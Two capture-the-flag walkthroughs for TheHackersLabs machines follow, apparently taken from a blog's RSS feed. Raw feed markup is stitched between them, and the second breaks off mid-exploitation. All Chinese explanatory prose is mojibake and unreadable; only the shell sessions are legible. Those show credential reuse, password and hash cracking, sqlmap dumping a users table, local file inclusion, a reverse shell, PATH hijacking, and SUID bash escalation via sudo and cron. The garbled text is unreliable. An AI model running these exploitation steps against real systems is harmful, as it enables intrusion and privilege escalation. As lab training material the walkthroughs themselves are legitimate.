Âú®ÈÇÆÁÆ±‰∏≠ÔºåÂèëÁé∞‰∫Ü‰∏ÄÂ∞ÅÂåÖÂê´`sam`Áî®Êà∑Âá≠ÊçÆÁöÑÈÇÆ‰ª∂„ÄÇ

&gt; **ÈÇÆ‰ª∂ÂÜÖÂÆπÊëòË¶Å:**
&gt; Usuario: sam
&gt; Contrase√±a: Welcome2024!

‰ΩøÁî®`su`ÂëΩ‰ª§ÂíåÊñ∞Ëé∑ÂèñÁöÑÂØÜÁ†ÅÂàáÊç¢Âà∞`sam`Áî®Êà∑„ÄÇ

```bash
bob@TheHackersLabs-Gyhabogados:~$ su sam
Password: Welcome2024!
sam@TheHackersLabs-Gyhabogados:/home/bob$ id
uid=1002(sam) gid=1006(abogados) groups=1006(abogados),100(users)
```

## 3. sam -&gt; dean

Êàê‰∏∫`sam`Áî®Êà∑ÂêéÔºåÊü•Áúã`/etc/samba/smb.conf`Êñá‰ª∂ÔºåÂèëÁé∞Âú®Â§ö‰∏™SambaÂÖ±‰∫´‰∏≠Ôºå`sam`ÂèØ‰ª•ËÆøÈóÆ `[CONFIDENCIALES]` Âíå `[RESPALDOS_IT]`„ÄÇ

```bash
sam@TheHackersLabs-Gyhabogados:/tmp$ cat /etc/samba/smb.conf
...
[RESPALDOS_IT]
  comment = Respaldos IT
  path = /mnt/RESPALDOS_IT
  ...
  valid users = sam, dean
```

Ê£ÄÊü• `/mnt/RESPALDOS_IT` ÁõÆÂΩïÂÜÖÂÆπ„ÄÇ

```bash
sam@TheHackersLabs-Gyhabogados:/mnt/RESPALDOS_IT$ ls -al
total 16
drwxr-x--- 2 root abogados 4096 Dec  8  2024 .
drwxr-xr-x 5 root root     4096 Dec  8  2024 ..
-rw-r--r-- 1 root abogados  520 Dec  8  2024 credenciales.psafe3
-rw-r--r-- 1 root abogados  582 Dec  7  2024 IMPORTANTE.txt

sam@TheHackersLabs-Gyhabogados:/mnt/RESPALDOS_IT$ cat IMPORTANTE.txt
...
La contrase√±a maestra es similar a la que te proporcion√© en la bienvenida: 'ChevyImpala1967'. Sin embargo, en lugar de '1967', deber√°s usar un a√±o diferente.
```

ÂèëÁé∞‰∏Ä‰∏™`PasswordSafe`ÁöÑÂØÜÁ†ÅÂ∫ìÊñá‰ª∂ `credenciales.psafe3` Âíå‰∏Ä‰∏™ÊèêÁ§∫Êñá‰ª∂„ÄÇÊèêÁ§∫Ë°®Êòé‰∏ªÂØÜÁ†ÅÊ†ºÂºè‰∏∫ `ChevyImpala` Âä†‰∏ä‰∏Ä‰∏™Âπ¥‰ªΩ„ÄÇ

Â∞Ü`credenciales.psafe3`‰º†ËæìÂà∞KaliÔºåÂπ∂ÁîüÊàê‰∏Ä‰∏™Âπ¥‰ªΩÂ≠óÂÖ∏ËøõË°åÁ†¥Ëß£„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ seq -f 'ChevyImpala%g' 1967 2025 &gt; p
‚îî‚îÄ$ pwsafe2john credenciales.psafe3 &gt; hash
‚îî‚îÄ$ john --wordlist=p hash
...
ChevyImpala1995  (credencial)
...
```

ÂØÜÁ†ÅÂ∫ì‰∏ªÂØÜÁ†Å‰∏∫ `ChevyImpala1995`„ÄÇ‰ΩøÁî®`pwsafe`Á≠âÂ∑•ÂÖ∑ÊâìÂºÄÂØÜÁ†ÅÂ∫ìÔºåÂèëÁé∞ÂÖ∂‰∏≠Â≠òÂÇ®‰∫Ü`dean`Áî®Êà∑ÁöÑÂá≠ÊçÆ„ÄÇ

&gt; **ÂØÜÁ†ÅÂ∫ìÂÜÖÂÆπ:**
&gt; dean:MasterOfPuppets1986

ÂàáÊç¢Âà∞`dean`Áî®Êà∑„ÄÇ

```bash
sam@TheHackersLabs-Gyhabogados:/mnt/RESPALDOS_IT$ su dean
Password: MasterOfPuppets1986
dean@TheHackersLabs-Gyhabogados:/mnt/RESPALDOS_IT$ id
uid=1001(dean) gid=1006(abogados) groups=1006(abogados),100(users)
```

## 4. dean -&gt; john

`dean`Áî®Êà∑ÂêåÊ†∑ÂèØ‰ª•ËÆøÈóÆSambaÂÖ±‰∫´„ÄÇÊ£ÄÊü• `[IT_TOOLS]` ÂÖ±‰∫´„ÄÇ

```bash
dean@TheHackersLabs-Gyhabogados:~$ cd /mnt/IT_TOOLS/
dean@TheHackersLabs-Gyhabogados:/mnt/IT_TOOLS$ ls -al
total 12
drwxr-x--- 2 root it   4096 Dec  8  2024 .
drwxr-xr-x 5 root root 4096 Dec  8  2024 ..
-rw-r--r-- 1 root root 1458 Dec  7  2024 private_key.ppk
```

ÂèëÁé∞‰∫Ü‰∏Ä‰∏™`PuTTY`Ê†ºÂºèÁöÑÁßÅÈí•Êñá‰ª∂ `private_key.ppk`„ÄÇÊü•ÁúãÂÖ∂ÂÜÖÂÆπÂèØÁü•ËØ•ÂØÜÈí•Êú™Âä†ÂØÜ„ÄÇ

```bash
dean@TheHackersLabs-Gyhabogados:/mnt/IT_TOOLS$ strings private_key.ppk
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
...
```

Â∞ÜÁßÅÈí•‰º†ËæìÂõûKaliÔºåÂπ∂‰ΩøÁî®`puttygen`ËΩ¨Êç¢‰∏∫OpenSSHÊ†ºÂºè„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ puttygen private_key.ppk -O private-openssh -o /tmp/id_rsa
‚îî‚îÄ$ chmod 600 /tmp/id_rsa
```

Ê†πÊçÆ`/home`ÁõÆÂΩï‰∏ãÁöÑÁî®Êà∑ÂàóË°®ÔºåÊé®ÊµãËØ•ÂØÜÈí•Â±û‰∫é`john`Áî®Êà∑„ÄÇÂ∞ùËØï‰ΩøÁî®ËØ•ÂØÜÈí•SSHÁôªÂΩï„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ssh john@192.168.205.131 -i /tmp/id_rsa
...
john@TheHackersLabs-Gyhabogados:~$ id
uid=1003(john) gid=1003(john) groups=1003(john),100(users),1005(it)
```

ÊàêÂäü‰ª•`john`Áî®Êà∑Ë∫´‰ªΩÁôªÂΩï„ÄÇ

## 5. john -&gt; root

ÁôªÂΩïÂêéÔºåÊ£ÄÊü•`john`ÁöÑ`sudo`ÊùÉÈôêÔºåÊèêÁ§∫ÈúÄË¶ÅÂØÜÁ†Å„ÄÇ

```bash
john@TheHackersLabs-Gyhabogados:~$ sudo -l
[sudo] password for john: 
sudo: a password is required
```

Âú®‰πãÂâç`dean`Áî®Êà∑ÁöÑÈÇÆÁÆ±‰∏≠ÔºåÊõæÂèëÁé∞‰∏ÄÂº†Âêç‰∏∫`impala_67.jpg`ÁöÑÂõæÁâá„ÄÇËøôÈÄöÂ∏∏ÊöóÁ§∫‰∫ÜÈöêÂÜôÊúØ„ÄÇÈÄöËøá‰ΩøÁî®ÈöêÂÜôÂ∑•ÂÖ∑ÔºàÂ¶Ç`stegseek`ÔºâÂàÜÊûêËØ•ÂõæÁâáÔºåÂèØ‰ª•ÊèêÂèñÂá∫`john`Áî®Êà∑ÁöÑÂØÜÁ†Å„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ stegseek impala_67.jpg                              
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: 'ironmaiden'
[i] Original filename: 'credentials.txt'.
[i] Extracting to 'impala_67.jpg.out'.
...
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat impala_67.jpg.out
john: TI!Powerful2024
```

Ëé∑ÂèñÂà∞ÂØÜÁ†Å `john:TI!Powerful2024`„ÄÇÂÜçÊ¨°Ê£ÄÊü•`sudo`ÊùÉÈôê„ÄÇ

```bash
john@TheHackersLabs-Gyhabogados:~$ sudo -l
[sudo] password for john: TI!Powerful2024
...
User john may run the following commands on TheHackersLabs-Gyhabogados:
    (ALL) PASSWD: /usr/bin/python3 /home/john/tools/backup.py
```

`john`Áî®Êà∑ÂèØ‰ª•‰ª•rootÊùÉÈôêÊâßË°å‰∏Ä‰∏™‰Ωç‰∫é`/home/john/tools/backup.py`ÁöÑPythonËÑöÊú¨„ÄÇ‰ΩÜÊ£ÄÊü•ÂèëÁé∞ËØ•Êñá‰ª∂ÂíåÁõÆÂΩïÂπ∂‰∏çÂ≠òÂú®„ÄÇ

```bash
john@TheHackersLabs-Gyhabogados:~$ ls -al /home/john/tools/backup.py
ls: cannot access '/home/john/tools/backup.py': No such file or directory
```

ËøôÊòØ‰∏Ä‰∏™ÂÖ∏ÂûãÁöÑsudoÊùÉÈôêÈÖçÁΩÆÈîôËØØ„ÄÇÊàë‰ª¨ÂèØ‰ª•Ëá™Ë°åÂàõÂª∫ËØ•ËÑöÊú¨ÔºåÂπ∂ÂÜôÂÖ•ÊèêÊùÉ‰ª£Á†Å„ÄÇËøôÈáåÈÄâÊã©‰∏∫`/bin/bash`Ê∑ªÂä†SUIDÊùÉÈôê‰Ωç„ÄÇ

```bash
john@TheHackersLabs-Gyhabogados:~$ echo 'import os; os.system('chmod +s /bin/bash')' &gt; /home/john/tools/backup.py
```

ÊâßË°å`sudo`ÂëΩ‰ª§Ëß¶ÂèëPayload„ÄÇ

```bash
john@TheHackersLabs-Gyhabogados:~$ sudo /usr/bin/python3 /home/john/tools/backup.py
john@TheHackersLabs-Gyhabogados:~$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1265648 Mar 29  2024 /bin/bash
```

ÂèØ‰ª•ÁúãÂà∞`/bin/bash`Â∑≤ÊàêÂäüËÆæÁΩÆSUID‰Ωç„ÄÇÁé∞Âú®ÊâßË°å`bash -p`Âç≥ÂèØËé∑Âæó‰∏Ä‰∏™euid‰∏∫0ÁöÑrootÊùÉÈôêShell„ÄÇ

```bash
john@TheHackersLabs-Gyhabogados:~$ bash -p
bash-5.2# id
uid=1003(john) gid=1003(john) euid=0(root) egid=0(root) groups=0(root),100(users),1003(john),1005(it)
```

# Âõõ„ÄÅËé∑ÂèñÂá≠ËØÅ

ÊàêÂäüÊèêÊùÉËá≥rootÂêéÔºåËØªÂèñÊúÄÁªàÁöÑflagÊñá‰ª∂„ÄÇ

```bash
bash-5.2# cat /home/dean/user.txt
930b5a4b9098abfdaa67f93a937593bf

bash-5.2# cat /root/notes.txt | grep Flag
Flag: 63baa2b1cd7ac490cf34e7c6a317067b
```

ÊàêÂäüËé∑ÂèñuserÂíåroot‰∏§‰∏™flagÔºåÊ∏óÈÄèÊµãËØïÂÆåÊàê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_ElCandidato.html</guid><pubDate>Sun, 17 Aug 2025 03:00:01 +0000</pubDate></item><item><title>thl_BackToTheFutureI</title><link>https://7r1UMPHK.github.io/post/thl_BackToTheFutureI.html</link><description># ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ

## 1.1 ‰∏ªÊú∫ÂèëÁé∞

È¶ñÂÖàÔºå‰ΩøÁî®`arp-scan`Â∑•ÂÖ∑Êâ´ÊèèÊú¨Âú∞ÁΩëÁªúÔºåÂØªÊâæÁõÆÊ†áÈù∂Êú∫ÁöÑIPÂú∞ÂùÄ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.142 08:00:27:b0:b9:32       PCS Systemtechnik GmbH
...
```

ÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫IP‰∏∫ `192.168.205.142`„ÄÇ

## 1.2 Á´ØÂè£Êâ´Êèè

‰ΩøÁî®`nmap`ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•Á°ÆÂÆöÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p0-65535 192.168.205.142
...
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
...
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫Ôºå‰∏ªÊú∫ÂºÄÊîæ‰∫ÜFTP(21)„ÄÅSSH(22)„ÄÅHTTP(80)ÂíåMySQL(3306)Âõõ‰∏™Á´ØÂè£„ÄÇ

#### 1.3 ÊúçÂä°Êé¢Êµã

ÈÄê‰∏ÄÊéíÊü•Â∑≤ÂèëÁé∞ÁöÑÊúçÂä°Ôºö

*   **FTP (21)**: Â∞ùËØïÂåøÂêçÁôªÂΩïÔºåË¢´ÊãíÁªù„ÄÇ
*   **SSH (22)**: Â∞ùËØï‰ΩøÁî®`hydra`ËøõË°åÂØÜÁ†ÅÁàÜÁ†¥ÔºåË¢´ÁõÆÊ†áÊúçÂä°Âô®ÊãíÁªùÔºåÈîôËØØ‰ø°ÊÅØÊòæÁ§∫‰∏çÊîØÊåÅÂØÜÁ†ÅËÆ§ËØÅÔºåËøôÊöóÁ§∫ÈúÄË¶Å‰ΩøÁî®ÂØÜÈí•ÁôªÂΩï„ÄÇ
*   **MySQL (3306)**: Â∞ùËØï‰ΩøÁî®`root`Áî®Êà∑ËøúÁ®ãËøûÊé•ÔºåË¢´ÊãíÁªùÔºåÈîôËØØ‰ø°ÊÅØÊòæÁ§∫ÊîªÂáªÊú∫IP‰∏çÂú®ÂÖÅËÆ∏ËøûÊé•ÁöÑÂàóË°®‰∏≠„ÄÇ
*   **HTTP (80)**: ËÆøÈóÆ80Á´ØÂè£ÔºåÈ°µÈù¢Ëá™Âä®Ë∑≥ËΩ¨Âà∞ÂüüÂêç `hillvalley.thl`„ÄÇ

# ‰∫å„ÄÅWebÊ∏óÈÄè

## 2.1 ÂüüÂêçÈÖçÁΩÆ‰∏é‰ø°ÊÅØÂèëÊéò

Ê†πÊçÆË∑≥ËΩ¨‰ø°ÊÅØÔºåÁºñËæëÊú¨Âú∞`/etc/hosts`Êñá‰ª∂ÔºåÂ∞ÜÂüüÂêç`hillvalley.thl`ÊåáÂêëÁõÆÊ†áIP„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ tail -n 1 /etc/hosts                                                                                 
192.168.205.142 hillvalley.thl
```

ËÆøÈóÆ`http://hillvalley.thl`ÔºåÂèëÁé∞‰∏Ä‰∏™‰ª•‚ÄúÊó∂Èó¥ÊóÖË°åÊó•Âøó‚Äù‰∏∫‰∏ªÈ¢òÁöÑÁôªÂΩïÈ°µÈù¢„ÄÇÊü•ÁúãÈ°µÈù¢Ê∫ê‰ª£Á†ÅÔºåÂèëÁé∞‰∏ÄÊù°ÊúâË∂£ÁöÑË•øÁè≠ÁâôËØ≠Ê≥®ÈáäÔºö`&lt;!-- ¬°El reloj de la torre no tiene nada que ver! ¬øO s√≠? --&gt;` (ÈíüÊ•ºË∑üËøô‰∫ãÊ≤°ÂÖ≥Á≥ªÔºÅÁúüÁöÑÂêóÔºü)ÔºåËøôÊòØÈù∂Êú∫‰∏ªÈ¢òÁöÑÊöóÁ§∫„ÄÇ

## 2.2 SQLÊ≥®ÂÖ•ÊºèÊ¥ûÂà©Áî®

Èù¢ÂØπÁôªÂΩïÊ°ÜÔºåÈ¶ñÂÖàÂ∞ùËØïËøõË°åSQLÊ≥®ÂÖ•„ÄÇ‰ΩøÁî®`sqlmap`Â∑•ÂÖ∑Ëá™Âä®ÂåñÊ£ÄÊµã„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sqlmap -u 'http://hillvalley.thl/' --batch --forms
...
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
...
```

`sqlmap`Á°ÆËÆ§‰∫Ü`username`ÂèÇÊï∞Â≠òÂú®Âü∫‰∫éÊó∂Èó¥ÁöÑSQLÁõ≤Ê≥®„ÄÇÈöèÂêéÔºåÂà©Áî®Ê≠§ÊºèÊ¥ûdumpÊï∞ÊçÆÂ∫ì‰ø°ÊÅØ„ÄÇ

```bash
# Ëé∑ÂèñÊï∞ÊçÆÂ∫ì
sqlmap -u 'http://hillvalley.thl/' --batch --forms --dbs
# ...
[*] hillvalley
[*] information_schema

# Ëé∑ÂèñË°®
sqlmap -u 'http://hillvalley.thl/' --batch --forms -D hillvalley --tables
# ...
+-------+
| users |
+-------+

# dumpÊï∞ÊçÆ
sqlmap -u 'http://hillvalley.thl/' --batch --forms -D hillvalley -T users --dump
# ...
+----+--------------------------------------------------------------+----------+
| id | password                                                     | username |
+----+--------------------------------------------------------------+----------+
| 1  | $2y$10$.YPplAJvApyzvxjuWXdeHO1lIkolJIq9GzGERgmHqHLi.1/.zGJhy | marty    |
+----+--------------------------------------------------------------+----------+
```

ÊàêÂäüËé∑ÂèñÂà∞Áî®Êà∑`marty`ÁöÑÂØÜÁ†ÅÂìàÂ∏å„ÄÇ

## 2.3 ÂìàÂ∏åÁ†¥Ëß£

‰ΩøÁî®`John the Ripper`Âíå`rockyou.txt`Â≠óÂÖ∏ÂØπËé∑ÂèñÁöÑbcryptÂìàÂ∏åËøõË°åÁ†¥Ëß£„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ echo '$2y$10$.YPplAJvApyzvxjuWXdeHO1lIkolJIq9GzGERgmHqHLi.1/.zGJhy' &gt; hash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
...
andromeda        (?)     
...
```

Á†¥Ëß£ÂæóÂà∞ÂØÜÁ†Å‰∏∫`andromeda`„ÄÇ

# ‰∏â„ÄÅÂàùÂßãËÆøÈóÆ (Initial Access)

## 3.1 ÊºèÊ¥ûÁªÑÂêàËé∑ÂèñWebshell

Â∞ùËØï‰ΩøÁî®`marty:andromeda`ÈÄöËøáSSHÁôªÂΩïÔºå‰ΩÜÂõ†ÊúçÂä°Âô®ÈÖçÁΩÆ‰∏∫ÂÖ¨Èí•ËÆ§ËØÅËÄåÂ§±Ë¥•„ÄÇ

ÂõûÂà∞WebÂ∫îÁî®Ôºå‰ΩøÁî®Á†¥Ëß£ÁöÑÂá≠ÊçÆ`marty:andromeda`ÊàêÂäüÁôªÂΩïÂêéÂè∞„ÄÇÁôªÂΩïÂêéÂèëÁé∞URLÁªìÊûÑ‰∏∫`http://hillvalley.thl/admin.php?page=about.php`ÔºåËøôÊûÅÊúâÂèØËÉΩÂ≠òÂú®Êú¨Âú∞Êñá‰ª∂ÂåÖÂê´ÔºàLFIÔºâÊºèÊ¥û„ÄÇ

Â∞ùËØïËØªÂèñ`/etc/passwd`Êñá‰ª∂Ôºö

```
http://hillvalley.thl/admin.php?page=../../../../etc/passwd
```

È°µÈù¢ÊàêÂäüÂõûÊòæ‰∫ÜÊñá‰ª∂ÂÜÖÂÆπÔºåËØÅÂÆû‰∫ÜLFIÊºèÊ¥ûÁöÑÂ≠òÂú®„ÄÇÊé•‰∏ãÊù•ÔºåÂà©Áî®`php://filter`ÈÖçÂêà`php_filter_chain_generator`Â∑•ÂÖ∑ÁîüÊàêpayloadÔºåÁªïËøáÈôêÂà∂ÊâßË°åPHP‰ª£Á†Å„ÄÇ

&gt; **Áü•ËØÜÁÇπË°•ÂÖÖ**: `php://filter`ÊòØPHP‰∏≠‰∏Ä‰∏™Âº∫Â§ßÁöÑÂ∞ÅË£ÖÂçèËÆÆÔºåÂÆÉÂÖÅËÆ∏Âú®ËØªÂèñÊñá‰ª∂Êó∂ÂØπÂÖ∂ÂÜÖÂÆπËøõË°åËøáÊª§ÂíåÂ§ÑÁêÜ„ÄÇ`php_filter_chain_generator`Â∑•ÂÖ∑ÂèØ‰ª•ÁîüÊàê‰∏ÄÁ≥ªÂàóÂ§çÊùÇÁöÑ`iconv`ÁºñÁ†ÅËΩ¨Êç¢ÈìæÔºåÂà©Áî®ÁâπÂÆöPHPÁâàÊú¨‰∏≠ÁöÑbugÔºåÊúÄÁªàÂØºËá¥‰ªªÊÑè‰ª£Á†ÅÊâßË°å„ÄÇ
&gt;
&gt; **Â∑•ÂÖ∑ÈìæÊé•**:https://github.com/synacktiv/php_filter_chain_generator

ÊàêÂäüÁîüÊàêÂèçÂºπshellÁöÑpayloadÂπ∂ÊâßË°åÔºåÂú®Êú¨Âú∞Kali‰∏ä‰ΩøÁî®`nc`ÁõëÂê¨ÔºåËé∑Âæó‰∫Ü`www-data`Áî®Êà∑ÁöÑshell„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/php_filter_chain_generator]
‚îî‚îÄ$ nc -lvnp 8888                 
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.142] 45106
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Âõõ„ÄÅÊùÉÈôêÊèêÂçá (Privilege Escalation)

## 4.1 Ê®™ÂêëÁßªÂä®Ôºöwww-data -&gt; marty

Âú®`www-data`ÁöÑshell‰∏≠ÔºåÊü•ÁúãWebÁõÆÂΩï‰∏ãÁöÑ`config.php`Êñá‰ª∂ÔºåÂèëÁé∞‰∫ÜÊï∞ÊçÆÂ∫ìÁöÑÁ°¨ÁºñÁ†ÅÂá≠ÊçÆ„ÄÇ

```bash
www-data@hillvalley:/var/www/project/app$ cat config.php 
&lt;?php
$host = 'localhost';
$user = 'marty';
$pass = 't1m3travel';
$db = 'hillvalley';
...
?&gt;
```

ÂèëÁé∞Áî®Êà∑`marty`ÁöÑÂè¶‰∏Ä‰∏™ÂØÜÁ†Å`t1m3travel`„ÄÇ‰ΩøÁî®Ê≠§ÂØÜÁ†ÅÊàêÂäü‰ªé`www-data`ÂàáÊç¢Âà∞`marty`Áî®Êà∑„ÄÇ

```bash
www-data@hillvalley:/var/www/project/app$ su marty
Password: 
marty@hillvalley:/var/www/project/app$ id
uid=1001(marty) gid=1001(marty) groups=1001(marty)
```

Âú®`marty`ÁöÑ‰∏ªÁõÆÂΩï‰∏ãÔºåÊâæÂà∞Âπ∂ËØªÂèñ‰∫Ü`user.txt`ÔºåËé∑ÂæóÁ¨¨‰∏Ä‰∏™flag„ÄÇ

## 4.2 Ê®™ÂêëÁßªÂä®Ôºömarty -&gt; docbrown

‰Ωú‰∏∫`marty`Áî®Êà∑ÔºåÂºÄÂßãÂØªÊâæËøõ‰∏ÄÊ≠•ÊèêÊùÉÁöÑÊñπÊ≥ï„ÄÇ`sudo -l`ÊòæÁ§∫Ê≤°ÊúâsudoÊùÉÈôê„ÄÇÂú®‰∏ªÁõÆÂΩï‰∏ãÂèëÁé∞‰∏Ä‰∏™Â±û‰∫é`docbrown`Áî®Êà∑ÁöÑÁ¨îËÆ∞Êñá‰ª∂`.flux_notes`ÔºåÂÜÖÂÆπ‰∏∫`Tiempos inestables... a√∫n necesito arreglar el runner para la pr√≥xima prueba.` (‰∏çÁ®≥ÂÆöÁöÑÊó∂Êúü... Êàë‰ªçÁÑ∂ÈúÄË¶Å‰∏∫‰∏ã‰∏ÄÊ¨°ÊµãËØï‰øÆÂ§çrunner„ÄÇ)ÔºåÊöóÁ§∫Â≠òÂú®‰∏Ä‰∏™Âêç‰∏∫'runner'ÁöÑÁ®ãÂ∫è„ÄÇ

‰ΩøÁî®`getcap`ÂëΩ‰ª§Ê£ÄÊü•Á≥ªÁªüÊñá‰ª∂ÁöÑLinux CapabilitiesÔºåÂèëÁé∞‰∫Ü‰∏Ä‰∏™ÂÖ≥ÈîÆÈÖçÁΩÆÔºö

```bash
marty@hillvalley:~$ getcap -r / 2&gt;/dev/null
/usr/local/bin/backup_runner cap_setuid=ep
...
```

&gt; **Áü•ËØÜÁÇπË°•ÂÖÖ**: Linux CapabilitiesÂ∞ÜrootÁî®Êà∑ÁöÑÁâπÊùÉÂàÜËß£‰∏∫Êõ¥Â∞èÁöÑÂçïÂÖÉ„ÄÇ`cap_setuid=ep`Ë°®Á§∫`/usr/local/bin/backup_runner`Ëøô‰∏™Á®ãÂ∫èÊã•Êúâ‰ªªÊÑèËÆæÁΩÆËøõÁ®ãUIDÁöÑËÉΩÂäõÔºåËøôÊòØÈùûÂ∏∏Âº∫Â§ßÁöÑÊùÉÈôê„ÄÇ

‰ΩøÁî®`strings`ÂëΩ‰ª§ÂàÜÊûê`backup_runner`ÔºåÂèëÁé∞ÂÆÉ‰ºöË∞ÉÁî®`tar`ÂëΩ‰ª§ÔºåÂπ∂‰∏îÊ≤°Êúâ‰ΩøÁî®ÁªùÂØπË∑ØÂæÑ„ÄÇ

```bash
marty@hillvalley:~$ strings /usr/local/bin/backup_runner
...
Usage: backup_runner &lt;filename&gt;
tar czf /tmp/%s-backup.tar.gz /home/docbrown/docs
...
```

ËøôÊûÑÊàê‰∫Ü‰∏Ä‰∏™ÂÖ∏ÂûãÁöÑ`$PATH`Âä´ÊåÅÊºèÊ¥û„ÄÇÈÄöËøáÂú®`/tmp`ÁõÆÂΩï‰∏ãÂàõÂª∫‰∏Ä‰∏™ÊÅ∂ÊÑèÁöÑ`tar`ËÑöÊú¨ÔºåÂπ∂Â∞ÜÂÖ∂Ë∑ØÂæÑÊ∑ªÂä†Âà∞`$PATH`ÁéØÂ¢ÉÂèòÈáèÁöÑÊúÄÂâçÈù¢ÔºåÂèØ‰ª•Âä´ÊåÅ`backup_runner`ÁöÑÊâßË°åÊµÅ„ÄÇ

```bash
marty@hillvalley:~$ cd /tmp
marty@hillvalley:/tmp$ echo '#!/bin/bash' &gt; tar
marty@hillvalley:/tmp$ echo '/bin/bash -p' &gt;&gt; tar
marty@hillvalley:/tmp$ chmod +x tar
marty@hillvalley:/tmp$ export PATH=/tmp:$PATH
marty@hillvalley:/tmp$ /usr/local/bin/backup_runner x
docbrown@hillvalley:/tmp$ id
uid=1000(docbrown) gid=1001(marty) groups=1001(marty)
```

ÊâßË°åÂêéÔºåÊàêÂäüÂàáÊç¢‰∏∫`docbrown`Áî®Êà∑„ÄÇ

## 4.3 ÊúÄÁªàÊèêÊùÉÔºödocbrown -&gt; root

‰Ωú‰∏∫`docbrown`Áî®Êà∑ÔºåÂÜçÊ¨°ÊâßË°å`sudo -l`Ê£ÄÊü•ÊùÉÈôê„ÄÇ

```bash
docbrown@hillvalley:/tmp$ sudo -l
...
User docbrown may run the following commands on hillvaley:
    (root) NOPASSWD: /usr/local/bin/time_daemon
```

ÂèëÁé∞`docbrown`ÂèØ‰ª•ÂÖçÂØÜ‰ª•`root`Ë∫´‰ªΩËøêË°å`/usr/local/bin/time_daemon`„ÄÇÂ∞ùËØïÊâßË°åËØ•Á®ãÂ∫èÔºåÂæóÂà∞Êä•Èîô‰ø°ÊÅØÔºö

```bash
docbrown@hillvalley:/home/docbrown$ sudo /usr/local/bin/time_daemon
[FLUX] No existe el archivo /tmp/sync: No such file or directory
```

Á®ãÂ∫èËØïÂõæËÆøÈóÆ`/tmp/sync`Êñá‰ª∂„ÄÇËøô‰∏é‰πãÂâçÂú®`marty`Áî®Êà∑‰∏ãÂèëÁé∞ÁöÑ`crontab`Êù°ÁõÆËÅîÁ≥ª‰∫ÜËµ∑Êù•Ôºö

```bash
marty@hillvalley:~$ cat /etc/crontab
...
* * * * * root /usr/local/bin/flux_admin.sh
marty@hillvalley:~$ ls -al /usr/local/bin/flux_admin.sh
ls: cannot access '/usr/local/bin/flux_admin.sh': No such file or directory
marty@hillvalley:~$ ls -al /usr/local/bin/
total 40
drwxr-xr-x  2 root root  4096 Jul 14 21:53 .
drwxr-xr-x 10 root root  4096 Jul 11 21:56 ..
-rwxr-xr-x  1 root root 16200 Jul 12 20:49 backup_runner
-rwx------  1 root root 16296 Jul 14 20:44 time_daemon
```

ÂÆöÊó∂‰ªªÂä°ÊØèÂàÜÈíüÈÉΩ‰ª•`root`ÊùÉÈôêÊâßË°å‰∏Ä‰∏™ÂΩìÊó∂Ëøò‰∏çÂ≠òÂú®ÁöÑËÑöÊú¨`/usr/local/bin/flux_admin.sh`„ÄÇËøôÈáåÁöÑÊèêÊùÉÊÄùË∑ØÊòØÔºöÁåúÊµã`time_daemon`‰ºöÂ§çÂà∂`/tmp/sync`Âéª`flux_admin.sh`

1. **ÂàõÂª∫Payload**ÔºöÂú®`/tmp`ÁõÆÂΩï‰∏ãÂàõÂª∫`sync`Êñá‰ª∂ÔºåÂÜÖÂÆπÊòØÊàë‰ª¨ÁöÑÊèêÊùÉÂëΩ‰ª§„ÄÇ

```bash
docbrown@hillvalley:/home/docbrown$ echo '#!/bin/bash' &gt; /tmp/sync
docbrown@hillvalley:/home/docbrown$ echo 'chmod +s /bin/bash' &gt;&gt; /tmp/sync
    docbrown@hillvalley:/home/docbrown$ chmod +x /tmp/sync
```

2. **Ëß¶ÂèëÊñá‰ª∂ÂÜôÂÖ•**Ôºö‰ª•`root`ÊùÉÈôêÊâßË°å`time_daemon`„ÄÇËØ•Á®ãÂ∫è‰ºöËØªÂèñ`/tmp/sync`ÁöÑÂÜÖÂÆπÔºåÂπ∂Â∞ÜÂÖ∂ÂÜôÂÖ•Âà∞`/usr/local/bin/flux_admin.sh`‰∏≠„ÄÇ

   ```bash
   docbrown@hillvalley:/home/docbrown$ sudo /usr/local/bin/time_daemon
   [88MPH] Sincronizaci√≥n completada. Listo para viajar.
   ```

